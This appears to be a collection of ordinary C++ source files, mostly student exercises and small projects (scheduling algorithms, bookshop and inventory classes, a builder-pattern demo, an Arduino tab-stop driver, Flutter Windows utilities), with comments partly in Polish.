    "#include \"utils.h\"\n\n#include <flutter_windows.h>\n#include <io.h>\n#include <stdio.h>\n#include <windows.h>\n\n#include <iostream>\n\nvoid CreateAndAttachConsole() {\n  if (::AllocConsole()) {\n    FILE *unused;\n    if (freopen_s(&unused, \"CONOUT$\", \"w\", stdout)) {\n      _dup2(_fileno(stdout), 1);\n    }\n    if (freopen_s(&unused, \"CONOUT$\", \"w\", stderr)) {\n      _dup2(_fileno(stdout), 2);\n    }\n    std::ios::sync_with_stdio();\n    FlutterDesktopResyncOutputStreams();\n  }\n}\n\nstd::vector<std::string> GetCommandLineArguments() {\n  // Convert the UTF-16 command line arguments to UTF-8 for the Engine to use.\n  int argc;\n  wchar_t** argv = ::CommandLineToArgvW(::GetCommandLineW(), &argc);\n  if (argv == nullptr) {\n    return std::vector<std::string>();\n  }\n\n  std::vector<std::string> command_line_arguments;\n\n  // Skip the first argument as it's the binary name.\n  for (int i = 1; i < argc; i++) {\n    command_line_arguments.push_back(Utf8FromUtf16(argv[i]));\n  }\n\n  ::LocalFree(argv);\n\n  return command_line_arguments;\n}\n\nstd::string Utf8FromUtf16(const wchar_t* utf16_string) {\n  if (utf16_string == nullptr) {\n    return std::string();\n  }\n  int target_length = ::WideCharToMultiByte(\n      CP_UTF8, WC_ERR_INVALID_CHARS, utf16_string,\n      -1, nullptr, 0, nullptr, nullptr)\n    -1; // remove the trailing null character\n  int input_length = (int)wcslen(utf16_string);\n  std::string utf8_string;\n  if (target_length <= 0 || target_length > utf8_string.max_size()) {\n    return utf8_string;\n  }\n  utf8_string.resize(target_length);\n  int converted_length = ::WideCharToMultiByte(\n      CP_UTF8, WC_ERR_INVALID_CHARS, utf16_string,\n      input_length, utf8_string.data(), target_length, nullptr, nullptr);\n  if (converted_length == 0) {\n    return std::string();\n  }\n  return utf8_string;\n}\n",
    "#include <iostream>\n#include \"ordered_array.hpp\"\n\nordered_array::ordered_array(int cap)\n{\n    this->cap = cap;\n    sz = 0;\n\n    data = new int[cap];\n}\n\nordered_array::~ordered_array()\n{\n    delete[] data;\n}\n\nint ordered_array::size()\n{\n    return sz;\n}\n\nint ordered_array::capacity()\n{\n    return cap;\n}\n\nvoid ordered_array::insert(int elem)\n{\n    // returns if the array is full\n    if (sz == cap)\n    {\n        return;\n    }\n\n    // return if the elem is min value\n    if (elem == -2147483648)\n    {\n        return;\n    }\n\n    // find pos where elem should be inserted\n    int i = 0;\n    while (i < sz && data[i] < elem)\n    {\n        i++;\n    }\n\n    //shift elem to the right\n    for (int j = sz; j > i; j--) \n    {\n        data[j] = data[j - 1];\n    }\n\n\n    // insert the new elem in correct position\n    data[i] = elem;\n    // increments the size of the array\n    sz++;\n\n}\n\nvoid ordered_array::remove(int elem)\n{\n    // shifting\n    // duplicates\n    // check if elem exixts or if arr is empty\n    if (!exists(elem) || sz == 0) {\n        return;\n    }\n\n    // 1 check if elem exists\n    // 2 find the first index of elem\n    int i;\n    for (i = 0; i < sz; ++i)\n    {\n        if (data[i] == elem)\n        {\n            break;\n        }\n    }\n\n\n    // 4 shift the array down\n    for (int j = i; j < sz - 1; j++) \n    {\n        data[j] = data[j + 1];\n    }\n\n    // decrement sz of array\n    sz--;\n\n}\n\nbool ordered_array::exists(int elem)\n{\n    for (int i = 0; i < sz; ++i)\n    {\n        if (data[i] == elem)\n        {\n            return true;\n        }\n    }\n    return false;\n}\n\nint &ordered_array::at(int i)\n{\n    // i<=0, i <sz\n   if (sz == 0) \n   {\n       throw std::out_of_range(\"Index out of range\");\n   } else if (i >= 0 && i < cap) \n   {\n       return data[i];\n   } else \n   {\n       throw std::out_of_range(\"Index out of range\");\n   }\n\n}\n",
    "#include <iostream>\n#include<fstream>\n#include <string>\n\n\n\n/**\n * @brief struktura zadania\n *  ID Numer identyfikacyjny zadania\n    r: Czas pojawienia si\u0119 zadania \n    p: Czas przetwarzania zadania\n    q: Termin wykonania zadania\n * \n */\nstruct task\n{\n  public:\n    int ID;\n    int r;\n    int p;\n    int q;\n};\n\n/**\n * @brief funkcja zamienia miejscami pola dwoch obiektow typu task\n * \n * @param a zadanie a\n * @param b zadanie b\n */\nvoid task_swap(task& a, task& b)\n{\n  std::swap(a.ID, b.ID);\n  std::swap(a.p, b.p);\n  std::swap(a.q, b.q);\n  std::swap(a.r, b.r);\n}\n\n/**\n * @brief Implementuje algorytm Schrage\n * \n * @param n liczba zadan\n * @param T tablica zadan \n * @param X tablica kolejnosci\n * @return int cmax\n */\nint schrage(int n, task* T, int* X)\n{\n  int ND[100], D[100];\t\t\t\t\t\t\t//ND - tablica zada\u0144 niedost\u0119pnych  D - tablica zada\u0144 dost\u0119pnych\n  int nd = n, d = 0, w = 0;\t\t// nd - liczba zada\u0144 niedost\u0119pnych  d-tablica zada\u0144 dost\u0119pnych  w-liczba zada\u0144 wykonanych \n  int  t = 0, cmax = 0;\t\t\t//t - obecna jednostka czasu  cmax-d\u0142ugo\u015b\u0107 najd\u0142u\u017cszego uszeregowania\n  for (int i = 0; i < n; i++)\n  {\n    ND[i] = i;\n  }\n  for (int i = 0; i < n - 1; i++)\t\t\t//sortowanie tablicy zada\u0144 niedost\u0119nych malej\u0105co po r\n  {\n    for (int j = 0; j < n - 1; j++)\n    {\n      if (T[ND[j]].r < T[ND[j + 1]].r)\n      {\n        std::swap(ND[j], ND[j + 1]);\n      }\n    }\n  }\n  while (w != n)\t\t\t\t\t//je\u015bli s\u0105 zadania niewykonane\n  {\n    if (nd != 0)\t\t\t\t//je\u015bli s\u0105 jeszcze zadania niedost\u0119pne\n    {\t\n      if (T[ND[nd - 1]].r <= t)\t\t//je\u015bli jest jakie\u015b task kt\u00f3re przysz\u0142o\n      {\n        D[d] = ND[nd - 1];\n        d++;\n        nd--;\n        for (int k = d - 1; k > 0; k--)\t\t\t//sortowanie tablicy zada\u0144 dost\u0119pnych rosn\u0105co po q\n        {\n          if (T[D[k]].q < T[D[k - 1]].q)\n          {\n            std::swap(D[k], D[k - 1]);\n          }\n        }\n        continue;\n      }\n    }\n    if (d != 0)\t\t\t//je\u015bli s\u0105 zadania dost\u0119pne\n    {\n      X[w] = D[d - 1];\n      t += T[X[w]].p;\n      cmax = std::max(cmax, t + T[X[w]].q);\n      d--;\n      w++;\n      continue;\n    }\n    if (d == 0 && T[ND[nd - 1]].r > t)\t\t\t//je\u015bli jest jakia\u015b przerwa w pracy to j\u0105 przeskocz\n    {\n      t = T[ND[nd - 1]].r;\n    }\n  }\n  return cmax;\n}\n\n\n/**\n * @brief \n * \n * @param n \n * @param T \n * @return int \n */\nint schrage_divide(int n, task* T)\n{\n  int ND[100];\n  int D[100];\n  int pom[100];\n  int nd = n;\n  int d = 0;\n  int  t = 0;\n  int cmax = 0;\n  int poz = 100;\n  int ile_zr = 0;\n  for (int i = 0; i < n; i++)\n  {\n    pom[i] = T[i].p;\n  }\n  for (int i = 0; i < n; i++)\n  {\n    ND[i] = i;\n  }\n  for (int i = 0; i < n - 1; i++)\t\t\t\n  {\n    for (int j = 0; j < n - 1; j++)\n    {\n      if (T[ND[j]].r < T[ND[j + 1]].r)\n      {\n        std::swap(ND[j], ND[j + 1]);\n      }\n    }\n  }\n  while (nd != 0 || d != 0)  \n  {\n    if (nd != 0) // dopoki sa dostepne zadania\n    {\n      if (T[ND[nd-1]].r <= t) // sprawdza czy mozna zaplanowac zadanie\n      {\n        D[d] = ND[nd - 1];\n        d++;\n        nd--;\n        for (int k = d - 1; k > 0; k--)\t\t\t\n        {\n          if (T[D[k]].q < T[D[k - 1]].q)\n          {\n            std::swap(D[k], D[k - 1]);\n          }\n        }\n        if (poz != 100)\n        {\n          if (T[D[d - 1]].q > T[poz].q)\n          {\n            D[d] = poz;\n            std::swap(D[d], D[d - 1]);\n            d++;\t\t\t\t\t\t\n            poz = 100;\n          }\n        }\n        continue;\n      }\n    }\n    if (d != 0)\n    {\n      if (poz == 100)\n      {\n        poz = D[d - 1];\n        d--;\n      }\n      if (nd != 0)\n      {\n        ile_zr = std::min(pom[poz], T[ND[nd - 1]].r - t);\n      }\n      else\n      {\n        ile_zr = pom[poz];\n      }\n      t += ile_zr;\n      pom[poz] -= ile_zr;\n      if (pom[poz]== 0)\n      {\n        cmax = std::max(cmax, t + T[poz].q);\n        poz = 100;\n      }\n      continue;\n    }\n    if (d == 0 && nd != 0)\n    {\n      if (T[ND[nd - 1]].r > t)\n      {\n        t = T[ND[nd - 1]].r;\n      }\n    }\n  }\n  return cmax;\n}\nint main()\n{\n  int X[100];\n  task T[100];\n  std::string s = \"data.00\", s1, s2;\n  std::ifstream f(\"data.txt\");\n  int n;\n  for (int i = 0; i < 9; i++)\t\t\t//p\u0119tla przechodz\u0105ca przez ka\u017cdy zbi\u00f3r danych\n  {\n    s1 = s + std::to_string(i) + \":\";\n    while (s2 != s1)\t\t\t\t//szukanie odpowiedniego zbioru danych\n    {\n      f >> s2;\n    }\n    f >> n;\t\t\t\t\t\t\t//wczytywanie ilo\u015bci zada\u0144 w danym zbiorze danych\n    for (int j = 0; j < n; j++)\t\t//wczytywanie parametr\u00f3w kolejnych zada\u0144\n    {\n      T[j].ID = j;\n      f >> T[j].r >> T[j].p >> T[j].q;\n    }\n    std::cout << \"| \" << s1 << std::endl;\n    std::cout << \"| Podzial: \" << schrage_divide(n, T) << std::endl;\n    std::cout << \"| Schrage: \" << schrage(n, T, X) << std::endl;\n    std::cout << \"| Roznica: \" << schrage(n, T, X) - schrage_divide(n, T) << std::endl;\n    for (int i = 0; i < n; i++)\n    {\n      std::cout << X[i]+1 << \" \";\n    }\n    std::cout <<std::endl<< \"===========================================\" <<std::endl;\n  }\n}\n",
    "#include \"bookshop.h\"\n#include <iostream>\n\nusing namespace std;\n\nint Bookshop::num_of_objects = 0;\n\nBookshop::Bookshop() {\n    m_books = nullptr;\n    num_of_objects++;\n\n    #ifdef _DEBUG\n    cout << \"Wywolano konstruktor domyslny klasy Bookshop, aktualna liczba obiektow tej klasy: \" << num_of_objects << endl;\n    #endif\n}\n\nBookshop::Bookshop(string name, Manager manager) {\n    m_name = name;\n    m_manager = manager;\n    num_of_objects++;\n    m_books = nullptr;\n\n    #ifdef _DEBUG\n    cout << \"Wywolano konstruktor klasy Bookshop, aktualna liczba obiektow tej klasy: \" << num_of_objects << endl;\n    #endif\n\n}\n\nBookshop::Bookshop(const Bookshop &bs) {\n    m_name = bs.m_name;\n    m_manager = bs.m_manager;\n    m_num_of_books = bs.m_num_of_books;\n\n    if (bs.m_books) {\n        m_books = new Book[m_num_of_books];\n        for (int i = 0; i < m_num_of_books; i++) {\n            m_books[i] = bs.m_books[i];\n        }\n    }\n    else\n        m_books = nullptr;\n    num_of_objects++;\n\n    #ifdef _DEBUG\n    cout << \"Wywolano konstruktor kopiujacy klasy Bookshop, aktualna liczba obiektow tej klasy: \" << num_of_objects << endl;\n    #endif\n}\n\nBookshop& Bookshop::operator=(const Bookshop &bs) {\n    if (this == &bs) {\n        return *this;\n    }\n\n    m_name = bs.m_name;\n    m_manager = bs.m_manager;\n    m_num_of_books = bs.m_num_of_books;\n\n    if (m_books) {\n        delete[] m_books;\n    }\n\n    if (bs.m_books) {\n        m_books = new Book[m_num_of_books];\n        for (int i = 0; i < m_num_of_books; i++) {\n            m_books[i] = bs.m_books[i];\n        }\n    }\n    else\n        m_books = nullptr;\n\n    return *this;\n}\n\nBookshop::~Bookshop() {\n    if (m_books != nullptr) {\n        delete[] m_books;\n    }\n\n    num_of_objects--;\n\n    #ifdef _DEBUG\n    cout << \"Wywolano destruktor klasy Bookshop, aktualna liczba obiektow tej klasy: \" << num_of_objects << endl;\n    #endif\n}\n\nint Bookshop::numOfElems() {\n    return num_of_objects;\n}\n\nostream& operator<<(ostream &s, Bookshop &bs) {\n    s << \"Nazwa ksiegarni: \" << bs.m_name << endl << \"Imie managera: \" << bs.m_manager.managersName() << endl\n      << \"Liczba ksiazek: \" << bs.m_num_of_books << endl;\n\n    if (bs.m_books)\n        for (int i = 0; i < bs.m_num_of_books; i++) {\n            s << \"Ksiazka nr \" << i << \": \" << endl << bs.m_books[i] << endl;\n        }\n\n    return s;\n}\n\nBook& Bookshop::operator[](int i) {\n    if (i < 0 || i >= m_num_of_books) {\n        throw logic_error( \"Nie ma ksiazki o takim indeksie\" );\n    }\n    else\n        return m_books[i];\n}\n\nBookshop& Bookshop::operator+=(const Bookshop &bs) {\n    int size = m_num_of_books + bs.m_num_of_books;\n    Book *tmp_array = new Book[size];\n    int a = m_num_of_books;\n\n    for (int i = 0; i < m_num_of_books; i++) {\n        tmp_array[i] = m_books[i];\n    }\n\n    for (int i = 0; i < bs.m_num_of_books; i++) {\n        for (int j = 0; j < m_num_of_books; j++) {\n            if (m_books[j] == bs.m_books[i]) {\n                size--;\n                break;\n            }\n            if (j == m_num_of_books - 1) {\n                tmp_array[a] = bs.m_books[i];\n                a++;\n            }\n        }\n    }\n\n    if (m_books)\n        delete[] m_books;\n\n    m_num_of_books = size;\n    m_books = new Book[size];\n\n    for (int i = 0; i < size; i++) {\n        m_books[i] = tmp_array[i];\n    }\n\n    delete[] tmp_array;\n    return *this;\n}\n\nBookshop::operator string() {\n    return (string)\"Ksiegarnia: \" + m_name + (string)\", Manager: \" + m_manager.managersName()\n           + (string)\", Liczba ksiazek: \" + to_string(m_num_of_books);\n}\n\nBookshop& Bookshop::operator--() {\n    if (!m_books)\n        return *this;\n\n    m_num_of_books--;\n    Book *tmp = new Book[m_num_of_books];\n\n    for (int i = 0; i < m_num_of_books; i++) {\n        tmp[i] = m_books[i];\n    }\n\n    delete[] m_books;\n    m_books = tmp;\n    return *this;\n}\n\nvoid Bookshop::addBook(const Book &b) {\n    for (int i = 0; i < m_num_of_books; i++) {\n        if (m_books[i] == b)\n            return;\n    }\n\n    Book *new_m_books = new Book[m_num_of_books + 1];\n    for (int i = 0; i < m_num_of_books; i++) {\n        new_m_books[i] = m_books[i];\n    }\n\n    new_m_books[m_num_of_books] = b;\n    m_num_of_books++;\n\n    if (m_books)\n        delete[] m_books;\n    m_books = new_m_books;\n}\n\nvoid Bookshop::deleteBook(int idx) {\n    if (idx < 0 || idx > m_num_of_books - 1)\n        return;\n\n    Book *new_m_books = new Book[m_num_of_books - 1];\n\n    for (int i = 0; i < idx; i++) {\n        new_m_books[i] = m_books[i];\n    }\n\n    for (int i = idx + 1; i < m_num_of_books; i++) {\n        new_m_books[i - 1] = m_books[i];\n    }\n\n    m_num_of_books--;\n    delete[] m_books;\n    m_books = new_m_books;\n}\n\n",
    "#include \"utils.h\"\n\n#include <flutter_windows.h>\n#include <io.h>\n#include <stdio.h>\n#include <windows.h>\n\n#include <iostream>\n\nvoid CreateAndAttachConsole() {\n  if (::AllocConsole()) {\n    FILE *unused;\n    if (freopen_s(&unused, \"CONOUT$\", \"w\", stdout)) {\n      _dup2(_fileno(stdout), 1);\n    }\n    if (freopen_s(&unused, \"CONOUT$\", \"w\", stderr)) {\n      _dup2(_fileno(stdout), 2);\n    }\n    std::ios::sync_with_stdio();\n    FlutterDesktopResyncOutputStreams();\n  }\n}\n\nstd::vector<std::string> GetCommandLineArguments() {\n  // Convert the UTF-16 command line arguments to UTF-8 for the Engine to use.\n  int argc;\n  wchar_t** argv = ::CommandLineToArgvW(::GetCommandLineW(), &argc);\n  if (argv == nullptr) {\n    return std::vector<std::string>();\n  }\n\n  std::vector<std::string> command_line_arguments;\n\n  // Skip the first argument as it's the binary name.\n  for (int i = 1; i < argc; i++) {\n    command_line_arguments.push_back(Utf8FromUtf16(argv[i]));\n  }\n\n  ::LocalFree(argv);\n\n  return command_line_arguments;\n}\n\nstd::string Utf8FromUtf16(const wchar_t* utf16_string) {\n  if (utf16_string == nullptr) {\n    return std::string();\n  }\n  int target_length = ::WideCharToMultiByte(\n      CP_UTF8, WC_ERR_INVALID_CHARS, utf16_string,\n      -1, nullptr, 0, nullptr, nullptr)\n    -1; // remove the trailing null character\n  int input_length = (int)wcslen(utf16_string);\n  std::string utf8_string;\n  if (target_length <= 0 || target_length > utf8_string.max_size()) {\n    return utf8_string;\n  }\n  utf8_string.resize(target_length);\n  int converted_length = ::WideCharToMultiByte(\n      CP_UTF8, WC_ERR_INVALID_CHARS, utf16_string,\n      input_length, utf8_string.data(), target_length, nullptr, nullptr);\n  if (converted_length == 0) {\n    return std::string();\n  }\n  return utf8_string;\n}\n",
    "#include \"Item.h\"\nItem::Item(){\n    SKU = -1;\n    description = \"\";\n    price = -1;\n    UOM = \"null\";\n    quantityOnHand = -1;\n    leadTime = -1;\n}\n\nItem::Item(int idnum){\n    SKU = idnum;\n}\n\nItem::Item(int idNum, std::string descp, double cost, std::string unit, int orderTime, int quantity){\n    SKU = idNum;\n    description = descp;\n    price = cost;\n    UOM = unit;\n    leadTime = orderTime;\n    quantityOnHand = quantity;\n}\n\nstd::string Item::GetPartInfo(){\n    return std::to_string(SKU) + \" - \" + description;\n}\n\ndouble Item::GetPrice(){\n    return price;\n}\n\nbool Item::InStock(){\n    return quantityOnHand > 0;\n}\n\n//TODO: make the dates work as intented\nbool Item::IsAvailable(int desiredDay){\n    if (InStock()){\n        return true;\n    }\n    else {\n        return desiredDay <= leadTime;\n    }\n}\n\n\nbool Item::operator==(const Item& obj){\n    return this->SKU == obj.SKU;\n}\n\nbool Item::operator<(const Item& obj){\n    return this->SKU < obj.SKU;\n}\n\nbool Item::operator>(const Item& obj){\n    return this->SKU > obj.SKU;\n}\n\n",
    "#include <Arduino.h>\n#include \"TabStopDataBase.h\"\n#include \"TabStopDriverClass.hpp\"\n#include \"TabStopReader.h\"\n#include \"TabStopDriver.h\"\n\n#pragma GCC optimize(\"-O0\")\n\n\n// TabStopsEngine all drivers off, leave in their current position.\nTabStopsEngine::~TabStopsEngine() {\n  for (int i = 0; stops[i].I2C_BIT != -1 && stops[i].SPIaddress != -1; i++) {\n    TabOff(i);\n  }\n}\n\n// drive all tabs to the \"off\" position\nvoid TabStopsEngine::init() {\n  for (int i = 0; stops[i].I2C_BIT != -1 && stops[i].SPIaddress != -1; i++) {\n    tabOff(i);\n    stops[i].MyState = standby;\n  }\n}\n\nconst int DRIVETIME = 200;  // drive for n milliseconds\n\n// update the tab data base\n// looking for tabs that are being driven and are wating for their timeout to\n// stop driving\nvoid TabStopsEngine::loop() {\n\n  // look through the data base for stops that need to be moved or are done\n  for (int i = 0; stops[i].I2C_BIT != -1 && stops[i].SPIaddress != -1; i++) {\n    switch (stops[i].MyState) {\n      case standby:\n        // do nothing\n        break;\n\n      case start_on:\n        // Serial.print(\"Turing tab\");\n        // Serial.print(i);\n        // Serial.print(\" on \");\n        // Serial.println (stops[i].TabStop);\n\n        TabSetOn(i);\n        stops[i].DriveTimeStamp = millis();\n        stops[i].MyState = wait_on;\n        break;\n\n      case start_off:\n        // Serial.print(\"Turing tab\");\n        // Serial.print(i);\n        // Serial.println(\" off\");\n        // Serial.println (stops[i].TabStop);\n\n        TabSetOff(i);\n        stops[i].DriveTimeStamp = millis();\n        stops[i].MyState = wait_off;\n        break;\n\n      case wait_on:\n        if (millis() - stops[i].DriveTimeStamp >= DRIVETIME) {\n          // Serial.print(\"done driving tab on\");\n          // Serial.print(i);\n          // Serial.println(\" on\");\n\n          TabOff(i);\n          stops[i].MyState = standby;\n        }\n        break;\n\n      case wait_off:\n        if (millis() - stops[i].DriveTimeStamp >= DRIVETIME) {\n          // Serial.print(\"done driving tab off\");\n          // Serial.print(i);\n          // Serial.println(\" off\");\n\n          TabOff(i);\n          stops[i].MyState = standby;\n        }\n        break;\n    }\n  }\n}\n\n// command  TAB on or off\nvoid TabStopsEngine::tabOn(int tab) {\n  if (tab < stopsSize) {\n    // if (isTabSet(stops[tab].I2C_BIT) != TABON) {\n    // Tab needs to be moved\n    stops[tab].MyState = start_on;\n    // } else {\n    //   // Serial.println(\"Tab DOES NOT need to be moved on\");\n    // }\n  }\n}\nvoid TabStopsEngine::tabOff(int tab) {\n  if (tab < stopsSize) {\n    // if (isTabSet(stops[tab].I2C_BIT) != TABOFF) {\n    // Tab needs to be moved\n    stops[tab].MyState = start_off;\n    // } else {\n    //   // Serial.println(\"Tab DOES NOT need to be moved off\");\n    // }\n  }\n}\n",
    "\ufeff#include <iostream>\n#include <string>\n\nusing namespace std;\n\n\nclass Car\n{\n\tstring name;\n\tstring body;\n\tint engine;\n\tint wheels;\n\tstring kpp;\npublic:\n\tvoid SetName(string name)\n\t{\n\t\tthis->name = name;\n\t}\n\tstring GetName()\n\t{\n\t\treturn this->name;\n\t}\n\tvoid SetBody(string body)\n\t{\n\t\tthis->body = body;\n\t}\n\tstring GetBody()\n\t{\n\t\treturn this->body;\n\t}\n\tvoid SetEngine(int engine)\n\t{\n\t\tthis->engine = engine;\n\t}\n\tint GetEngine()\n\t{\n\t\treturn this->engine;\n\t}\n\tvoid SetWheels(int wheels)\n\t{\n\t\tthis->wheels = wheels;\n\t}\n\tint GetWheels()\n\t{\n\t\treturn this->wheels;\n\t}\n\tvoid SetKPP(string kpp)\n\t{\n\t\tthis->kpp = kpp;\n\t}\n\tstring GetKPP()\n\t{\n\t\treturn this->kpp;\n\t}\n\tvoid ShowCar()\n\t{\n\t\tcout << \"Car name: \" << name << \"\\nFrame: \" << body << \"\\nEngine (l. s): \" << engine << \"\\nWheels (R): \" << wheels << \"\\nKpp: \" << kpp << \"\\n\\n\";\n\t}\n};\n\nclass CarBuilder abstract\n{\nprotected:\n\tCar car;\npublic:\n\tCar GetCar()\n\t{\n\t\treturn car;\n\t}\n\tvirtual void BuildName() abstract;\n\tvirtual void BuildBody() abstract;\n\tvirtual void BuildEngine() abstract;\n\tvirtual void BuildWheels() abstract;\n\tvirtual void BuildKPP() abstract;\n};\n\n\nclass DaewooLanosCar : public CarBuilder\n{\npublic:\n\tvoid BuildName() override\n\t{\n\t\tcar.SetName(\"Daewoo Lanos\");\n\t}\n\tvoid BuildBody() override\n\t{\n\t\tcar.SetBody(\"Sedan\");\n\t}\n\tvoid BuildEngine() override\n\t{\n\t\tcar.SetEngine(98);\n\t}\n\tvoid BuildWheels() override\n\t{\n\t\tcar.SetWheels(13);\n\t}\n\tvoid BuildKPP() override\n\t{\n\t\tcar.SetKPP(\"5 Manual\");\n\t}\n};\nclass FordProbeCar : public CarBuilder\n{\npublic:\n\tvoid BuildName() override\n\t{\n\t\tcar.SetName(\"Ford Probe\");\n\t}\n\tvoid BuildBody() override\n\t{\n\t\tcar.SetBody(\"Coupe\");\n\t}\n\tvoid BuildEngine() override\n\t{\n\t\tcar.SetEngine(160);\n\t}\n\tvoid BuildWheels() override\n\t{\n\t\tcar.SetWheels(14);\n\t}\n\tvoid BuildKPP() override\n\t{\n\t\tcar.SetKPP(\"4 Auto\");\n\t}\n};\nclass UAZPatriotCar : public CarBuilder\n{\npublic:\n\tvoid BuildName() override\n\t{\n\t\tcar.SetName(\"UAZ Patriot\");\n\t}\n\tvoid BuildBody() override\n\t{\n\t\tcar.SetBody(\"Station wagon\");\n\t}\n\tvoid BuildEngine() override\n\t{\n\t\tcar.SetEngine(120);\n\t}\n\tvoid BuildWheels() override\n\t{\n\t\tcar.SetWheels(16);\n\t}\n\tvoid BuildKPP() override\n\t{\n\t\tcar.SetKPP(\"4 Manual\");\n\t}\n};\nclass HyundaiGetzCar : public CarBuilder\n{\npublic:\n\tvoid BuildName() override\n\t{\n\t\tcar.SetName(\"Hyundai Getz\");\n\t}\n\tvoid BuildBody() override\n\t{\n\t\tcar.SetBody(\"Hatchback\");\n\t}\n\tvoid BuildEngine() override\n\t{\n\t\tcar.SetEngine(66);\n\t}\n\tvoid BuildWheels() override\n\t{\n\t\tcar.SetWheels(13);\n\t}\n\tvoid BuildKPP() override\n\t{\n\t\tcar.SetKPP(\"4 auto\");\n\t}\n};\n\nclass Shop\n{\n\tCarBuilder* carBuilder;\npublic:\n\tvoid SetCarBuilder(CarBuilder* cb)\n\t{\n\t\tcarBuilder = cb;\n\t}\n\tCar GetCar()\n\t{\n\t\treturn carBuilder->GetCar();\n\t}\n\tvoid ConstructCar()\n\t{\n\t\tcarBuilder->BuildName();\n\t\tcarBuilder->BuildBody();\n\t\tcarBuilder->BuildEngine();\n\t\tcarBuilder->BuildWheels();\n\t\tcarBuilder->BuildKPP();\n\t}\n};\n\nvoid client(CarBuilder* builder)\n{\n\tShop shop;\n\tshop.SetCarBuilder(builder);\n\tshop.ConstructCar();\n\tCar car = shop.GetCar();\n\tcar.ShowCar();\n}\n\nvoid main()\n{\n\tCarBuilder* builder = new DaewooLanosCar();\n\tclient(builder);\n\tdelete builder;\n\n\tbuilder = new FordProbeCar();\n\tclient(builder);\n\tdelete builder;\n\n\tbuilder = new UAZPatriotCar();\n\tclient(builder);\n\tdelete builder;\n\n\tbuilder = new HyundaiGetzCar();\n\tclient(builder);\n\tdelete builder;\n\n\tsystem(\"pause\");\n}",
    "#include <iostream>\n#include <math.h>\n\nusing namespace std;\n\nint zad1(int a,int b, int c){\n    if((pow(a,2)+pow(b,2))==pow(c,2)) return 1;\n    else return 0;\n}\nvoid zad2(){\n    cout << \"Tr\u00f3jki liczb pitagorejskich z zakresu od 1 do 10:\\n\";\n    for (int a = 1; a <= 10; ++a) {\n        for (int b = 1; b <= 10; ++b) {\n            for (int c = 1; c <= 10; ++c) {\n                if (zad1(a, b, c)) {\n                    cout << a << \", \" << b << \", \" << c << \"\\n\";\n                }\n            }\n        }\n    }\n}\nvoid zad3(int tab[], int length) {\n    for (int i = 0; i < length - 1; ++i) {\n        for (int j = 0; j < length - i - 1; ++j) {\n            if (tab[j] > tab[j + 1]) {\n                int temp = tab[j];\n                tab[j] = tab[j + 1];\n                tab[j + 1] = temp;\n            }\n        }\n    }\n}\n\n\n\nvoid zad4(int tab[], int length) {\n    for (int i = 0; i < length - 1; ++i) {\n        for (int j = 0; j < length - i - 1; ++j) {\n            if (tab[j] < tab[j + 1]) {\n                int temp = tab[j];\n                tab[j] = tab[j + 1];\n                tab[j + 1] = temp;\n            }\n        }\n    }\n}\nint zad5(int n){\n    if(n==0) return 1;\n    else return n*zad5(n-1);\n}\nint zad6(int n){\n    int result=1;\n    for(int i=1;i<=n;i++){\n        result*=i;\n    }\n    return result;\n}\nint zad7(int n){\n    int result = 0;\n    int odd = 1;\n\n    while (n >= odd) {\n        n -= odd;\n        odd += 2;\n        result++;\n    }\n\n    return result;\n}\nint zad8(int number){\n    int sqrtNumber = sqrt(number);\n\n    if (number % 100 == sqrtNumber)return 1;\n    else return 0;\n}\nint zad9(int number){\n    double sqrtNumber = sqrt(number);\n\n    if (sqrtNumber == floor(sqrtNumber)) return 1;\n    else return 0;\n\n}\nbool zad10(int number){\n    if (number <= 1) {\n        return false;\n    }\n\n    for (int i = 2; i * i <= number; ++i) {\n        if (number % i == 0) {\n            return false;\n    }\n\n    return true;\n}\n}\n\nint main()\n{\n    //zad1\n\n    int a,b,c;\n    int tab[]= {3,6,1,8,4,1,9,5};\n    int tab2[]= {5,8,1,5,0,4,6,8};\n    cout<<\"podaj liczbe: \";\n    cin>>a;\n    cout<<\"podaj liczbe: \";\n    cin>>b;\n    cout<<\"podaj liczbe: \";\n    cin>>c;\n    cout << \"zad1\" << endl;\n    if(zad1(a,b,c)) cout<<\"Te liczby sa pitagorejskie\"<<endl;\n    else cout<<\"Te liczby nie sa pitagorejskie\"<<endl;\n\n    //zad2\n    cout << \"zad2\" << endl;\n    zad2();\n    //zad3\n    cout << \"zad3\" << endl;\n    int n = sizeof(tab) / sizeof(tab[0]);\n    for(int i=0;i<n;i++){\n        cout<<tab[i]<<\" \";\n    }\n\n    zad3(tab,n);\n    cout<<endl;\n    for(int i=0;i<n;i++){\n        cout<<tab[i]<<\" \";\n    }\n    cout<<endl;\n    //zad4\n    cout << \"zad4\" << endl;\n    n = sizeof(tab2) / sizeof(tab2[0]);\n    for(int i=0;i<n;i++){\n        cout<<tab2[i]<<\" \";\n    }\n    zad4(tab2,n);\n    cout<<endl;\n    for(int i=0;i<n;i++){\n        cout<<tab2[i]<<\" \";\n    }\n    cout<<endl;\n    //zad5\n    cout << \"zad5\" << endl;\n    cout<<\"Podaj n:\";\n    cin>>a;\n    cout<<a<<\"! = \"<<zad5(a)<<endl;\n    //zad6\n    cout << \"zad6\" << endl;\n    cout<<a<<\"! = \"<<zad6(a)<<endl;\n    //zad7\n    cout << \"zad7\" << endl;\n    cout<<\"Liczba calkowita pierwiastka z liczby: \"<<c<<\" to: \"<<zad7(c)<<endl;\n    //zad8\n    cout << \"zad8\" << endl;\n    cout<<\"Podaj liczbe: \";\n    cin>>a;\n    if(zad8(a))cout << \"Liczba \" << a << \" konczy sie swoim pierwiastkiem.\" << endl;\n    else cout << \"Liczba \" << a << \" konczy nie sie swoim pierwiastkiem.\" << endl;\n    //zad9\n    cout << \"zad9\" << endl;\n\n    if(zad9(a))cout << \"Liczba \" << a << \" jest kwadratem liczby calkowitej.\" <<endl;\n    else cout << \"Liczba \" << a << \" nie jest kwadratem liczby calkowitej.\" <<endl;\n    //zad10\n    cout << \"zad10\" << endl;\n    if(zad10(a)) cout << \"Liczba \" << a << \" jest liczba pierwsza.\" << endl;\n    else cout << \"Liczba \" << a << \" nie jest liczba pierwsza.\" << endl;\n    return 0;\n}\n",
